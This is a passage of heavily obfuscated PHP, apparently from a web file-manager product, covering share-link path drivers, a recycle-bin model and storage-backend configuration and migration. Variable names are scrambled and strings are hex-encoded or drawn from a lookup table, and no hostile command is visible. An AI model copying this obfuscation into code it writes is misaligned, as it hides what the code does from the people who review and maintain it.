$¤ ¸’²ñ =& $_SERVER[¼’ç§¼´]; $½ò”‘Şú = IO::listAll($”åçàæ©); $Ü¯½‘º = rtrim($this->pathParse[$¤ ¸’²ñ[571]][$¤ ¸’²ñ[1266]], $¤ ¸’²ñ[8]); foreach ($½ò”‘Şú as &$Éó²‰¬) { $Éó²‰¬[$¤ ¸’²ñ[87]] = $this->pathDriver . $¤ ¸’²ñ[8] . ltrim(substr($Éó²‰¬[$¤ ¸’²ñ[87]], strlen($Ü¯½‘º)), $¤ ¸’²ñ[8]); } unset($Éó²‰¬); return $½ò”‘Şú; } public function listAllSimple($Ä¥ô®Ê©, $•Ì²” = false) { $»„êÜë‚ =& $_SERVER[¼’ç§¼´]; $¤˜Ì£„Š = $this->listAll($Ä¥ô®Ê©); $È¼Ûó­Ç = $this->pathParse[$»„êÜë‚[506]]; if (trim($È¼Ûó­Ç, $»„êÜë‚[8]) == trim(get_path_father($È¼Ûó­Ç), $»„êÜë‚[8])) { $•Ì²” = !0; } return IO::init($»„êÜë‚[12])->listAllSimpleMake($¤˜Ì£„Š, $È¼Ûó­Ç, $•Ì²”); } public function getPathOuter($³¢‘´·½) { $‚ôø§Ğ¯ =& $_SERVER[¼’ç§¼´]; $¼Ê¬ç¤Ü = KodIO::parse($³¢‘´·½); if ($¼Ê¬ç¤Ü[$‚ôø§Ğ¯[33]] == KodIO::KOD_SHARE_ITEM) { return $¼Ê¬ç¤Ü[$‚ôø§Ğ¯[87]]; } $Á¤·Îı  = KodIO::clear($³¢‘´·½); $“˜Æ”Õ = KodIO::clear($this->pathParse[$‚ôø§Ğ¯[571]][$‚ôø§Ğ¯[1266]]); $¹®ç¾¼ = substr($Á¤·Îı , strlen($“˜Æ”Õ)); if (substr($Á¤·Îı , 0, strlen($“˜Æ”Õ)) != $“˜Æ”Õ) { return !1; } return $this->pathParse[$‚ôø§Ğ¯[1260]] . $‚ôø§Ğ¯[8] . ltrim($¹®ç¾¼, $‚ôø§Ğ¯[8]); } public function getType() { $åÙ¶¼û¥ =& $_SERVER[¼’ç§¼´]; $ş–Õı = str_replace($åÙ¶¼û¥[77], $åÙ¶¼û¥[12], get_class($this)); return strtolower($ş–Õı); } public function isOsDriver($—–«‰ÑÓ) { return IO::isOsDriver($—–«‰ÑÓ); } public function info($¤Ô ùº) { return $this->infoParse($¤Ô ùº); } public function infoAuth($ŞÇèñÕ) { return $this->infoParse($ŞÇèñÕ); } public function infoWithChildren($Öü‘œ¦•) { return $this->infoParse($Öü‘œ¦•, !0); } public function infoFull($‡‹Ã†Œ ) { return $this->infoParse($‡‹Ã†Œ ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ëèÕ­¿ ) { $this->pathParse = $ëèÕ­¿ ; } protected function infoParse($Û‚ç×Ë, $¶“ËîËÙ = false) { $Öâ©Æ³“ =& $_SERVER[¼’ç§¼´]; return Action($Öâ©Æ³“[1265])->sharePathInfo($this->pathParse[$Öâ©Æ³“[87]], !0, $¶“ËîËÙ); } public function listPath($¯µ¿›«‚, $Åìãİ¦ = false) { $¨ÊÜõÚÑ =& $_SERVER[¼’ç§¼´]; $¹óÎã¹ = IO::listPath($¯µ¿›«‚, $Åìãİ¦); if (!$¹óÎã¹) { return $¹óÎã¹; } if (is_array($¹óÎã¹[$¨ÊÜõÚÑ[1438]])) { $È©¡Á = Action($¨ÊÜõÚÑ[1447])->parsePathChildren($¹óÎã¹[$¨ÊÜõÚÑ[1438]], array($¨ÊÜõÚÑ[506] => $¯µ¿›«‚)); $¹óÎã¹[$¨ÊÜõÚÑ[1438]] = Action($¨ÊÜõÚÑ[1265])->shareItemInfo($È©¡Á); } foreach ($¹óÎã¹ as $é›Úóš€ => $†ÃÓîæú) { if (!in_array($é›Úóš€, array($¨ÊÜõÚÑ[86], $¨ÊÜõÚÑ[85]))) { continue; } foreach ($†ÃÓîæú as $‹‰Ù¸Ç« => $È©¡Á) { $È©¡Á = Action($¨ÊÜõÚÑ[1447])->parsePathChildren($È©¡Á, array($¨ÊÜõÚÑ[506] => $¯µ¿›«‚)); $¹óÎã¹[$é›Úóš€][$‹‰Ù¸Ç«] = Action($¨ÊÜõÚÑ[1265])->shareItemInfo($È©¡Á); } } return $¹óÎã¹; } } $_file = $_SERVER[$_SERVER[¼’ç§¼´][432]]; goto e–ïğùìø†; D“ÅÆ¡Ë»Ñ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\162\x63\x65\x5f\162\145\143\171\143\154\x65"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\124\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\x65\162\x74", "\146\165\156\143\164\151\x6f\x6e")); public function listData($¼¡×¬òí = false) { $Ç¼¿«À =& $_SERVER[¼’ç§¼´]; $¼¡×¬òí = $¼¡×¬òí ? $¼¡×¬òí : USER_ID; $°èŠ¬¥¥ = $this->where(array($Ç¼¿«À[1774] => $¼¡×¬òí))->select(); return array_to_keyvalue($°èŠ¬¥¥, $Ç¼¿«À[12], $Ç¼¿«À[193]); } public function moveToRecycle($…©Ğñ›Ø) { $ıĞŠ²¼’ =& $_SERVER[¼’ç§¼´]; $ÛÊ£è   = Model($ıĞŠ²¼’[1430]); $¼şˆË†Ï = $ÛÊ£è  ->sourceInfo($…©Ğñ›Ø); if (!$¼şˆË†Ï || $¼şˆË†Ï[$ıĞŠ²¼’[516]] == $ıĞŠ²¼’[91]) { return; } $áÑ§Çöø = array($ıĞŠ²¼’[502] => $…©Ğñ›Ø, $ıĞŠ²¼’[1774] => USER_ID, $ıĞŠ²¼’[662] => $¼şˆË†Ï[$ıĞŠ²¼’[190]], $ıĞŠ²¼’[663] => $¼şˆË†Ï[$ıĞŠ²¼’[580]], $ıĞŠ²¼’[666] => $¼şˆË†Ï[$ıĞŠ²¼’[595]]); $this->add($áÑ§Çöø); $this->recycleMove($…©Ğñ›Ø, 1); if ($¼şˆË†Ï[$ıĞŠ²¼’[496]] == $ıĞŠ²¼’[91]) { $ ‚ÕÆò¬ = array($ıĞŠ²¼’[666] => array($ıĞŠ²¼’[626], $¼şˆË†Ï[$ıĞŠ²¼’[595]] . $…©Ğñ›Ø . $ıĞŠ²¼’[627])); $ÛÊ£è  ->where($ ‚ÕÆò¬)->setField($ıĞŠ²¼’[516], 1); } } public function clear() { $this->remove(!1); } public function remove($ÌõÑÂË³ = false, $Œû·³–Ë = false) { $´èòÜÛ¬ =& $_SERVER[¼’ç§¼´]; $Œû·³–Ë = $Œû·³–Ë ? $Œû·³–Ë : USER_ID; $ĞĞ°¥åê = Model($´èòÜÛ¬[1430]); $†¡¤ëø¢ = $this->listData($Œû·³–Ë); $ÌõÑÂË³ = $ÌõÑÂË³ === !1 ? !1 : $ÌõÑÂË³; $êô‚×¸ = array(); foreach ($†¡¤ëø¢ as $¥˜¹ˆú) { if ($ÌõÑÂË³ != !1 && !in_array($¥˜¹ˆú, $ÌõÑÂË³)) { continue; } $ò¹¦­§Ë = $ĞĞ°¥åê->sourceInfo($¥˜¹ˆú); $ĞĞ°¥åê->remove($¥˜¹ˆú, !1); $­ƒ®éİ• = $ò¹¦­§Ë[$´èòÜÛ¬[190]] . $´èòÜÛ¬[11] . $ò¹¦­§Ë[$´èòÜÛ¬[580]]; $êô‚×¸[$­ƒ®éİ•] = array($´èòÜÛ¬[662] => $ò¹¦­§Ë[$´èòÜÛ¬[190]], $´èòÜÛ¬[580] => $ò¹¦­§Ë[$´èòÜÛ¬[580]]); $this->where(array($´èòÜÛ¬[193] => $¥˜¹ˆú))->delete(); } foreach ($êô‚×¸ as $à›ğÓîÁ) { $ĞĞ°¥åê->targetSpaceUpdate($à›ğÓîÁ[$´èòÜÛ¬[190]], $à›ğÓîÁ[$´èòÜÛ¬[580]]); } } public function restore($–ö÷Ô° = false) { $—•ÄçÖ = $this->listData(); $this->_restoreSource($—•ÄçÖ, $–ö÷Ô°); } public function removeUserAll($’Ï³Ã§) { $this->remove(!1, $’Ï³Ã§); } public function restoreItem($°¦¢ò™) { $this->_restoreSource(array($°¦¢ò™), array($°¦¢ò™)); } private function _restoreSource($ŠğÛŸ«¼, $Ğ¨Ê¾°) { $ù¼İìª• =& $_SERVER[¼’ç§¼´]; $ª°¯ƒÕ„ = Model($ù¼İìª•[1430]); $Ğ¨Ê¾° = $Ğ¨Ê¾° == !1 ? !1 : $Ğ¨Ê¾°; if (!$ŠğÛŸ«¼) { return !0; } $‹òâ’Ìó = array(); foreach ($ŠğÛŸ«¼ as $à®ğĞÇñ) { if ($Ğ¨Ê¾° != !1 && !in_array($à®ğĞÇñ, $Ğ¨Ê¾°)) { continue; } $º†É®× = $ª°¯ƒÕ„->sourceInfo($à®ğĞÇñ); $÷ÇùµË¶ = $ª°¯ƒÕ„->sourceInfo($º†É®×[$ù¼İìª•[192]]); if ($÷ÇùµË¶[$ù¼İìª•[516]] == $ù¼İìª•[91]) { continue; } $ª°¯ƒÕ„->lockMoveStart($à®ğĞÇñ); $this->recycleMove($à®ğĞÇñ, 0); if ($º†É®×[$ù¼İìª•[496]] == $ù¼İìª•[91]) { $´·µ† = array($ù¼İìª•[666] => array($ù¼İìª•[626], $º†É®×[$ù¼İìª•[595]] . $à®ğĞÇñ . $ù¼İìª•[627])); $ª°¯ƒÕ„->where($´·µ†)->setField($ù¼İìª•[516], 0); $this->restoreFolderChildren($à®ğĞÇñ, $ŠğÛŸ«¼); } $this->where(array($ù¼İìª•[193] => $à®ğĞÇñ))->delete(); $ª°¯ƒÕ„->folderSizeReset($º†É®×[$ù¼İìª•[192]]); $‹òâ’Ìó[] = $º†É®×[$ù¼İìª•[192]]; if ($º†É®×[$ù¼İìª•[496]] == $ù¼İìª•[91]) { $‹òâ’Ìó[] = $à®ğĞÇñ; } $ª°¯ƒÕ„->lockMoveEnd($à®ğĞÇñ); } $ª°¯ƒÕ„->updateModifyTime($‹òâ’Ìó); } private function restoreFolderChildren($ó‘á¸íÈ, $ïú€“˜Õ) { $ƒÙÛ—• =& $_SERVER[¼’ç§¼´]; $Æ¦ÎµÜë = Model($ƒÙÛ—•[1430]); $£­‰Ä‘Œ = array($ƒÙÛ—•[193] => array($ƒÙÛ—•[7], array())); foreach ($ïú€“˜Õ as $à¯”ÆŞÁ) { if ($à¯”ÆŞÁ == $ó‘á¸íÈ) { continue; } if (!$Æ¦ÎµÜë->isParentOf($ó‘á¸íÈ, $à¯”ÆŞÁ)) { continue; } $şÌ¯Ó° = $Æ¦ÎµÜë->sourceInfo($à¯”ÆŞÁ); if ($şÌ¯Ó°[$ƒÙÛ—•[496]] == $ƒÙÛ—•[91]) { $£­‰Ä‘Œ[] = array($ƒÙÛ—•[666] => array($ƒÙÛ—•[626], $şÌ¯Ó°[$ƒÙÛ—•[595]] . $à¯”ÆŞÁ . $ƒÙÛ—•[627])); } else { $£­‰Ä‘Œ[$ƒÙÛ—•[193]][1][] = $à¯”ÆŞÁ; } } if (!$£­‰Ä‘Œ[$ƒÙÛ—•[193]][1]) { unset($£­‰Ä‘Œ[$ƒÙÛ—•[193]]); } if (!$£­‰Ä‘Œ) { return; } if (is_array($£­‰Ä‘Œ[$ƒÙÛ—•[193]]) && is_array($£­‰Ä‘Œ[$ƒÙÛ—•[193]][1])) { $£­‰Ä‘Œ[$ƒÙÛ—•[193]][1] = array_unique($£­‰Ä‘Œ[$ƒÙÛ—•[193]][1]); } $£­‰Ä‘Œ[$ƒÙÛ—•[1086]] = $ƒÙÛ—•[2086]; $Æ¦ÎµÜë->where($£­‰Ä‘Œ)->setField($ƒÙÛ—•[516], 1); } private function recycleMove($à…Şšñ¶, $±ÀÜŒäŸ = 1) { $Ÿ—Ïƒ§ =& $_SERVER[¼’ç§¼´]; $‡æÔĞ× = Model($Ÿ—Ïƒ§[1430]); $ÚÆ×Ğ‚İ = Model($Ÿ—Ïƒ§[2316]); $ì¢¸¤ÄÕ = array($Ÿ—Ïƒ§[193] => $à…Şšñ¶); if ($±ÀÜŒäŸ) { $‡æÔĞ×->where($ì¢¸¤ÄÕ)->setField($Ÿ—Ïƒ§[516], 1); $ÚÆ×Ğ‚İ->eventRecycle($à…Şšñ¶, $Ÿ—Ïƒ§[2317]); } else { $ñÍÂı­ş = $‡æÔĞ×->where($ì¢¸¤ÄÕ)->find(); $®ìš±¯¡ = $ñÍÂı­ş[$Ÿ—Ïƒ§[496]] == $Ÿ—Ïƒ§[91]; $‚•¯Ò‹ê = $‡æÔĞ×->fileNameAuto($ñÍÂı­ş[$Ÿ—Ïƒ§[192]], $ñÍÂı­ş[$Ÿ—Ïƒ§[32]], REPEAT_RENAME_FOLDER, $®ìš±¯¡); if ($‚•¯Ò‹ê != $ñÍÂı­ş[$Ÿ—Ïƒ§[32]]) { $‡æÔĞ×->rename($à…Şšñ¶, $‚•¯Ò‹ê); } $‡æÔĞ×->where($ì¢¸¤ÄÕ)->setField($Ÿ—Ïƒ§[516], 0); $ÚÆ×Ğ‚İ->eventRecycle($à…Şšñ¶, $Ÿ—Ïƒ§[2318]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\x73\x6f\x75\162\x63\145\x53\x65\x63\x72\x65\164\114\x69\x73\x74"; public $field = array("\163\x6f\x75\162\x63\x65\x49\x44", "\x74\171\x70\145\x49\x44", "\143\x72\145\x61\164\145\125\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x73\x74\157\162\x61\x67\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\151\172\x65\x4d\141\x78", "\x73\171\x73\x74\x65\155", "\x64\x65\146\141\x75\x6c\x74", "\144\x72\x69\166\145\x72", "\x63\x6f\156\146\151\x67"); public function listData($øİé·ì = false, $¤“Úãû = "\155\157\144\151\146\x79\124\x69\x6d\145", $‰¬·×šŒ = false) { $Ü”¥Øå‘ =& $_SERVER[¼’ç§¼´]; $Í¯Ş…ˆÄ = parent::listData($øİé·ì, $¤“Úãû, $‰¬·×šŒ); if ($øİé·ì) { return $Í¯Ş…ˆÄ; } $Ğòº¦µ = array(); if ($GLOBALS[$Ü”¥Øå‘[2319]]) { $Ğòº¦µ = $this->ioSizeUseGet(array_to_keyvalue($Í¯Ş…ˆÄ, $Ü”¥Øå‘[12], $Ü”¥Øå‘[486])); } foreach ($Í¯Ş…ˆÄ as $Äöæ·Óù => $¹ºĞü) { unset($Í¯Ş…ˆÄ[$Äöæ·Óù][$Ü”¥Øå‘[6]]); $Í¯Ş…ˆÄ[$Äöæ·Óù][$Ü”¥Øå‘[1972]] = isset($Ğòº¦µ[$¹ºĞü[$Ü”¥Øå‘[486]]]) ? $Ğòº¦µ[$¹ºĞü[$Ü”¥Øå‘[486]]] : 0; } return $Í¯Ş…ˆÄ; } public function ioSizeUseGet($ìçÜÓïÇ) { $ôëé™³ö =& $_SERVER[¼’ç§¼´]; if (!$ìçÜÓïÇ) { return array(); } $éÀÖ†™È = $ôëé™³ö[2320] . implode($ôëé™³ö[50], $ìçÜÓïÇ); $íü˜³½È = Cache::get($éÀÖ†™È); if ($íü˜³½È) { return $íü˜³½È; } $Á™ºà†ı = array($ôëé™³ö[906] => $ôëé™³ö[486], $ôëé™³ö[2321] => $ôëé™³ö[79]); $ÆöªØíó = array($ôëé™³ö[906] => array($ôëé™³ö[7], $ìçÜÓïÇ)); $íü˜³½È = Model($ôëé™³ö[878])->field($Á™ºà†ı)->where($ÆöªØíó)->group($ôëé™³ö[906])->select(); $íü˜³½È = array_to_keyvalue($íü˜³½È, $ôëé™³ö[486], $ôëé™³ö[79]); Cache::set($éÀÖ†™È, $íü˜³½È, 600); return $íü˜³½È; } public function getConfig($ÄÂãûï“) { $½‚ÊÊÎ = parent::listData($ÄÂãûï“); $â¾Ü†š‰ = _get($½‚ÊÊÎ, $_SERVER[¼’ç§¼´][6], array()); if ($â¾Ü†š‰ && !is_array($â¾Ü†š‰)) { $â¾Ü†š‰ = json_decode($â¾Ü†š‰, !0); } return $â¾Ü†š‰; } public function update($çî¢¦ºÜ, $´è™±‘) { $¡ƒ÷‹å =& $_SERVER[¼’ç§¼´]; $ÖÎìûÏ¤ = $´è™±‘[$¡ƒ÷‹å[32]]; $ÌÂÈÀ»ø = array_to_keyvalue(parent::listData(), $¡ƒ÷‹å[32]); if (isset($ÌÂÈÀ»ø[$ÖÎìûÏ¤]) && $ÌÂÈÀ»ø[$ÖÎìûÏ¤][$¡ƒ÷‹å[486]] != $çî¢¦ºÜ) { return !1; } $this->checkPwd($çî¢¦ºÜ, $´è™±‘); if (isset($´è™±‘[$¡ƒ÷‹å[2322]]) && $´è™±‘[$¡ƒ÷‹å[2322]] == $¡ƒ÷‹å[91]) { $this->checkConfig($´è™±‘); } unset($´è™±‘[$¡ƒ÷‹å[2322]]); $íúßĞËê = parent::update($çî¢¦ºÜ, $´è™±‘); if ($íúßĞËê && $´è™±‘[$¡ƒ÷‹å[37]]) { $ÈßÙ¿³ä = 0; foreach ($ÌÂÈÀ»ø as $Ì­Ïå„µ) { if ($Ì­Ïå„µ[$¡ƒ÷‹å[37]] && $Ì­Ïå„µ[$¡ƒ÷‹å[486]] != $çî¢¦ºÜ) { $ÈßÙ¿³ä = $Ì­Ïå„µ[$¡ƒ÷‹å[486]]; parent::update($Ì­Ïå„µ[$¡ƒ÷‹å[486]], array($¡ƒ÷‹å[37] => 0)); } } $this->updateBackup($çî¢¦ºÜ, $ÈßÙ¿³ä); } return $íúßĞËê; } public function add($‚Ö£ŸÆé) { $ÄûÕì£¥ =& $_SERVER[¼’ç§¼´]; $êÛƒğš€ = array_to_keyvalue(parent::listData(), $ÄûÕì£¥[32]); if (isset($êÛƒğš€[$‚Ö£ŸÆé[$ÄûÕì£¥[32]]])) { return !1; } $this->checkConfig($‚Ö£ŸÆé); $Ù£Ü¦ÈŸ = parent::insert($‚Ö£ŸÆé); if ($Ù£Ü¦ÈŸ && $‚Ö£ŸÆé[$ÄûÕì£¥[37]]) { foreach ($êÛƒğš€ as $©Ïºâù) { if ($©Ïºâù[$ÄûÕì£¥[37]]) { parent::update($©Ïºâù[$ÄûÕì£¥[486]], array($ÄûÕì£¥[37] => 0)); } } } return $Ù£Ü¦ÈŸ; } public function updateBackup($¹Ğõ®€¹, $æ«†Œ”Û) { $™ÁùÚáÔ =& $_SERVER[¼’ç§¼´]; if (!$æ«†Œ”Û) { return; } $Çæğéî× = Model($™ÁùÚáÔ[836])->config(); if ($Çæğéî×[$™ÁùÚáÔ[1752]] != $™ÁùÚáÔ[91] || $Çæğéî×[$™ÁùÚáÔ[840]] != $æ«†Œ”Û) { return; } $î±ï©§Ö = Model($™ÁùÚáÔ[858])->get($™ÁùÚáÔ[872]); $î±ï©§Ö = json_decode($î±ï©§Ö, !0); if (!$î±ï©§Ö) { return; } $î±ï©§Ö[$™ÁùÚáÔ[840]] = $¹Ğõ®€¹; Model($™ÁùÚáÔ[858])->set(array($™ÁùÚáÔ[872] => $î±ï©§Ö)); } public function checkPwd($…úîí¨˜, &$ğ“¢ŞÙ³) { $ÅÖ¨şÏ– =& $_SERVER[¼’ç§¼´]; if (empty($ğ“¢ŞÙ³[$ÅÖ¨şÏ–[6]])) { return; } $ÖÙãÃ£• = $ğ“¢ŞÙ³[$ÅÖ¨şÏ–[6]]; if (!is_array($ÖÙãÃ£•)) { $ÖÙãÃ£• = json_decode($ÖÙãÃ£•, !0); } $—ïĞ—Î¯ = $ÅÖ¨şÏ–[12]; $©×ıÈÙÇ = array($ÅÖ¨şÏ–[2323], $ÅÖ¨şÏ–[2324], $ÅÖ¨şÏ–[975]); foreach ($©×ıÈÙÇ as $ô‚¬Îóß) { if (isset($ÖÙãÃ£•[$ô‚¬Îóß])) { $—ïĞ—Î¯ = $ô‚¬Îóß; break; } } if (!$—ïĞ—Î¯) { return; } $†àˆ‹†· = $this->getConfig($…úîí¨˜); $÷•ÓÃØä = $†àˆ‹†·[$—ïĞ—Î¯]; $éØ§øß› = $ÖÙãÃ£•[$—ïĞ—Î¯]; if ($éØ§øß› == str_repeat($ÅÖ¨şÏ–[222], strlen($÷•ÓÃØä))) { $ÖÙãÃ£•[$—ïĞ—Î¯] = $÷•ÓÃØä; $ğ“¢ŞÙ³[$ÅÖ¨şÏ–[6]] = json_encode($ÖÙãÃ£•); } else { if ($éØ§øß› != $÷•ÓÃØä) { $ğ“¢ŞÙ³[$ÅÖ¨şÏ–[2322]] = $ÅÖ¨şÏ–[91]; } } } public function checkConfig(&$Ê½ÇóÒÏ, $ÂÍé’ğ˜ = false) { $¶÷³ù±• =& $_SERVER[¼’ç§¼´]; $İ‚ÈÂïö = strtolower($Ê½ÇóÒÏ[$¶÷³ù±•[98]]); $ÎŞÖâó = $Ê½ÇóÒÏ[$¶÷³ù±•[6]]; if (!is_array($ÎŞÖâó)) { $ÎŞÖâó = json_decode($ÎŞÖâó, !0); } foreach ($ÎŞÖâó as $ÃÖ€¸Ë· => $ëÁ¦ñ›÷) { if (is_string($ëÁ¦ñ›÷)) { $ÎŞÖâó[$ÃÖ€¸Ë·] = trim($ëÁ¦ñ›÷); } } $ÎŞÖâó[$¶÷³ù±•[2325]] = rand_string(6); $­™« ³ = $GLOBALS[$¶÷³ù±•[6]][$¶÷³ù±•[92]][$¶÷³ù±•[914]]; $ÛùïØó¥ = isset($­™« ³[$İ‚ÈÂïö]) ? $­™« ³[$İ‚ÈÂïö] : ucfirst($İ‚ÈÂïö); $†…®‰·÷ = $¶÷³ù±•[77] . $ÛùïØó¥; if (!$ÛùïØó¥ || !class_exists($†…®‰·÷)) { if ($ÂÍé’ğ˜) { return LNG($¶÷³ù±•[2326]); } write_log(array($¶÷³ù±•[2327], $Ê½ÇóÒÏ, get_caller_info()), $¶÷³ù±•[215]); show_json(LNG($¶÷³ù±•[2326]), !1, $Ê½ÇóÒÏ); } $…˜ê— È = new $†…®‰·÷($ÎŞÖâó); if (in_array($İ‚ÈÂïö, $…˜ê— È->objectDriver)) { try { if (!$…˜ê— È->isBucketCors() && !$…˜ê— È->setBucketCors()) { $œ£í•…• = LNG($¶÷³ù±•[2328]); $œ£í•…• .= $¶÷³ù±•[2329] . LNG($¶÷³ù±•[2330]); } } catch (Exception $ÌÚ–‘È–) { $œ£í•…• = $ÌÚ–‘È–->getMessage(); } if (isset($œ£í•…•)) { return $this->_parseError($œ£í•…•, $İ‚ÈÂïö, $ÂÍé’ğ˜); } if ($İ‚ÈÂïö == $¶÷³ù±•[68] && !$…˜ê— È->checkRegion()) { return $this->_parseError(LNG($¶÷³ù±•[2331]), $İ‚ÈÂïö, $ÂÍé’ğ˜); } } $ÜßÆš»¼ = rtrim($ÎŞÖâó[$¶÷³ù±•[1271]], $¶÷³ù±•[8]) . $¶÷³ù±•[8]; $³õ™æŸÏ = $…˜ê— È->getPath($ÜßÆš»¼ . $¶÷³ù±•[1275]); try { if ($İ‚ÈÂïö == $¶÷³ù±•[109]) { $…˜ê— È->mkdir($ÜßÆš»¼); } $úÂİŸßĞ = $…˜ê— È->mkfile($³õ™æŸÏ); if (!$úÂİŸßĞ) { $œ£í•…• = LNG($¶÷³ù±•[2328]); } } catch (Exception $ÌÚ–‘È–) { $œ£í•…• = $ÌÚ–‘È–->getMessage(); } if (isset($œ£í•…•)) { return $this->_parseError($œ£í•…•, $İ‚ÈÂïö, $ÂÍé’ğ˜); } $ÎŞÖâó[$¶÷³ù±•[1271]] = $ÜßÆš»¼; $Ê½ÇóÒÏ[$¶÷³ù±•[6]] = json_encode($ÎŞÖâó); $Ê½ÇóÒÏ[$¶÷³ù±•[98]] = $ÛùïØó¥; return !0; } private function _parseError($÷å¼­ƒÉ, $Æ”¾Æ’Ù, $¨«ß¼¥Ş = false) { $’ˆßÀ– =& $_SERVER[¼’ç§¼´]; if ($Æ”¾Æ’Ù == $’ˆßÀ–[68] && stripos($÷å¼­ƒÉ, $’ˆßÀ–[2332])) { $ï­ú†È§ = explode($’ˆßÀ–[10], $÷å¼­ƒÉ); $é„©½È³ = isset($ï­ú†È§[1]) ? $ï­ú†È§[1] : $’ˆßÀ–[12]; $İÁªµ‹À = array($’ˆßÀ–[2333] => LNG($’ˆßÀ–[2334]), $’ˆßÀ–[2335] => LNG($’ˆßÀ–[2336])); if (isset($İÁªµ‹À[$é„©½È³])) { $÷å¼­ƒÉ = $İÁªµ‹À[$é„©½È³]; } } if (stripos($÷å¼­ƒÉ, $’ˆßÀ–[2337]) === 0) { $šëŞÎ˜ = strpos($÷å¼­ƒÉ, $’ˆßÀ–[178]); if ($šëŞÎ˜ === !1) { $šëŞÎ˜ = strpos($÷å¼­ƒÉ, $’ˆßÀ–[4]); } if ($šëŞÎ˜ !== !1) { $÷å¼­ƒÉ = substr($÷å¼­ƒÉ, $šëŞÎ˜ + 1); } } $÷å¼­ƒÉ = LNG($’ˆßÀ–[1278]) . $÷å¼­ƒÉ; if ($¨«ß¼¥Ş) { return $÷å¼­ƒÉ; } show_json($÷å¼­ƒÉ, !1); } public function driverListSystem() { $“ˆ¥ÌİÌ =& $_SERVER[¼’ç§¼´]; $Ï”ï±µØ = parent::listData(); $‚‡ÔÏöæ = array(); foreach ($Ï”ï±µØ as $Ş®®±ëÅ) { unset($Ş®®±ëÅ[$“ˆ¥ÌİÌ[233]], $Ş®®±ëÅ[$“ˆ¥ÌİÌ[88]]); if (!is_array($Ş®®±ëÅ[$“ˆ¥ÌİÌ[6]])) { $Ş®®±ëÅ[$“ˆ¥ÌİÌ[6]] = json_decode($Ş®®±ëÅ[$“ˆ¥ÌİÌ[6]], !0); } $‚‡ÔÏöæ[] = $Ş®®±ëÅ; } return $‚‡ÔÏöæ; } public function defaultDriver() { $±²•Å°¯ =& $_SERVER[¼’ç§¼´]; $°”ÒêÏ = parent::listData(); $€™ñŸù = array_filter_by_field($°”ÒêÏ, $±²•Å°¯[37], 1); $€™ñŸù = $€™ñŸù[0]; if (!$€™ñŸù) { return array(); } if (!is_array($€™ñŸù[$±²•Å°¯[6]])) { $€™ñŸù[$±²•Å°¯[6]] = json_decode($€™ñŸù[$±²•Å°¯[6]], !0); } return $€™ñŸù; } public function driverInfo($Ä•“Åé°) { $ùÊ²é¡„ =& $_SERVER[¼’ç§¼´]; $ÓÜÃ¬²õ = array_to_keyvalue(parent::listData(), $ùÊ²é¡„[486]); if (!isset($ÓÜÃ¬²õ[$Ä•“Åé°])) { return !1; } $ï„¤Âîø = $ÓÜÃ¬²õ[$Ä•“Åé°]; if (!is_array($ï„¤Âîø[$ùÊ²é¡„[6]])) { $ï„¤Âîø[$ùÊ²é¡„[6]] = json_decode($ï„¤Âîø[$ùÊ²é¡„[6]], !0); } return $ï„¤Âîø; } public function remove($€¦¬ÒÆ) { $this->removeShareItems($€¦¬ÒÆ); return parent::remove($€¦¬ÒÆ); } public function removeWithFile($êè½³’£, $Òíó¼½¦, $üÂş³ö×, $ËîèÕ¯ = false) { $¥èäöÙé =& $_SERVER[¼’ç§¼´]; $»•ŒÌì = array($¥èäöÙé[906] => $êè½³’£); $î«´±ô = Model($¥èäöÙé[555])->where($»•ŒÌì)->count(); $®®æº´Á = Model($¥èäöÙé[555])->where($»•ŒÌì)->sum($¥èäöÙé[79]); $Ñ²«¬üñ = $Òíó¼½¦ . $¥èäöÙé[2338] . $êè½³’£; $×ªåùêÅ = LNG($Òíó¼½¦ == $¥èäöÙé[634] ? $¥èäöÙé[2339] : $¥èäöÙé[2340]); $»ˆêªñê = new TaskFileTransfer($Ñ²«¬üñ, $¥èäöÙé[215], $î«´±ô, $×ªåùêÅ . $¥èäöÙé[473] . $üÂş³ö×[$¥èäöÙé[32]] . $¥èäöÙé[214] . $êè½³’£); $»ˆêªñê->task[$¥èäöÙé[851]] = (double) $®®æº´Á; $®¯îŠº = KodIO::defaultDriver(); $ÉïËë– = $®¯îŠº[$¥èäöÙé[486]]; $ç¢× Â = $ôÁ»Ÿé = $Ì‰«áÜÇ = array(); $Šåòšæâ = Model($¥èäöÙé[232])->where($»•ŒÌì)->field($¥èäöÙé[2341])->select(); foreach ($Šåòšæâ as $¢‹ à½§) { $ñƒÀ‹ĞÚ = $¢‹ à½§[$¥èäöÙé[552]]; if ($ËîèÕ¯) { $ôÁ»Ÿé[] = $ñƒÀ‹ĞÚ; continue; } $·ïŠ¬…Ö = $¢‹ à½§[$¥èäöÙé[87]]; $º’¬òõ = get_path_father($·ïŠ¬…Ö); $Ì‰«áÜÇ[] = $º’¬òõ; $º’¬òõ = str_replace("\173\x69\x6f\72{$êè½³’£}\x7d\x2f", "\x7b\x69\x6f\72{$ÉïËë–}\x7d\57", $º’¬òõ); if (!IO::exist($·ïŠ¬…Ö)) { $ç¢× Â[] = $ñƒÀ‹ĞÚ; $»ˆêªñê->updateFileEnd($¢‹ à½§[$¥èäöÙé[32]], $¢‹ à½§[$¥èäöÙé[79]]); write_log($¥èäöÙé[2342] . $·ïŠ¬…Ö, $¥èäöÙé[1915]); continue; } $Ùò™¯¥± = IO::move($·ïŠ¬…Ö, $º’¬òõ, REPEAT_RENAME); if (!$Ùò™¯¥±) { $ôÁ»Ÿé[] = $ñƒÀ‹ĞÚ; $»ˆêªñê->updateFileEnd($¢‹ à½§[$¥èäöÙé[32]], $¢‹ à½§[$¥èäöÙé[79]]); write_log($¥èäöÙé[2343] . $·ïŠ¬…Ö, $¥èäöÙé[1915]); continue; } $»•ŒÌì = array($¥èäöÙé[552] => $ñƒÀ‹ĞÚ); $”ò²ı¨… = array($¥èäöÙé[906] => $ÉïËë–, $¥èäöÙé[87] => $Ùò™¯¥±); Model($¥èäöÙé[232])->where($»•ŒÌì)->save($”ò²ı¨…); } $Î§³±  = $»ˆêªñê->task; if (!$ËîèÕ¯) 